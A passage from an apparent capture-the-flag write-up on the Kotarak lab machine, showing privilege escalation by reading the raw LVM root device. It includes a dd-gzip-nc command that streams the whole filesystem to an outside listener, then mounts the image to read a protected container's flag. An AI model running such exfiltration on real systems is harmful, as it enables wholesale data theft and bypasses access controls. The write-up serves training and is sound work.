NAME                   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda                      8:0    0   12G  0 disk 
├─sda1                   8:1    0  120M  0 part /boot
├─sda2                   8:2    0    1K  0 part 
└─sda5                   8:5    0 11.9G  0 part 
  ├─Kotarak--vg-root   252:0    0    7G  0 lvm  /
  └─Kotarak--vg-swap_1 252:1    0    1G  0 lvm  [SWAP]
sr0                     11:0    1 1024M  0 rom 

```

`Kotarak--vg-root` and `Kotarak--vg-swap_1` are the root file system and swap space under LVM. Both live on the `sda5` partition on `sda`. The LVM mappings live in `/dev/mapper`:

```

atanas@kotarak-dmz:~$ ls -l /dev/mapper/
total 0
crw------- 1 root root 10, 236 May 14 20:51 control
lrwxrwxrwx 1 root root       7 May 14 20:51 Kotarak--vg-root -> ../dm-0
lrwxrwxrwx 1 root root       7 May 14 20:51 Kotarak--vg-swap_1 -> ../dm-1

```

`dm-0` is the device I want to read off to get the root of the filesystem.

#### Exfil Filesystem

I’ll use `dd` to read from the device, and `nc` to copy the entire filesystem off the device back to my host. I’ll send it through `gzip` to compress it so that it will move faster, but it still takes over seven minutes:

```

atanas@kotarak-dmz:~$ time dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.15 443
14680064+0 records in
14680064+0 records out
7516192768 bytes (7.5 GB, 7.0 GiB) copied, 438.725 s, 17.1 MB/s

real    7m18.932s
user    2m4.900s
sys     0m25.648s

```

Back on my host:

```

oxdf@parrot$ nc -lnvp 443 > dm-0.gz
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.55] 34610

```

When it’s done, the compressed file is a bit over two gigs:

```

oxdf@parrot$ ls -lh dm-0.gz
-rwxrwx--- 1 root vboxsf 2.2G May 15 15:21 dm-0.gz

```

It decompresses to seven gigs:

```

oxdf@parrot$ gunzip dm-0.gz 
oxdf@parrot$ ls -lh dm-0 
-rwxrwx--- 1 root vboxsf 7.0G May 15 15:40 dm-0

```

I can mount it, and access the file system:

```

oxdf@parrot$ sudo mount dm-0-orig /mnt/
oxdf@parrot$ ls /mnt/
backups  bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old

```

`/root` is the host system, with `flag.txt`, not the container with `root.txt`:

```

oxdf@parrot$ ls /mnt/root/
app.log  flag.txt

```

The containers keep their file system mounted in `/var/lib/lxc/`:

```

oxdf@parrot$ sudo cat /mnt/var/lib/lxc/kotarak-int/rootfs/root/root.txt
950d1425************************

```

I can verify that as atanas I can’t just access that directory directly:

```

atanas@kotarak-dmz:~$ ls -ld /var/lib/lxc
drwx------ 3 root root 4096 Jul 21  2017 /var/lib/lxc

```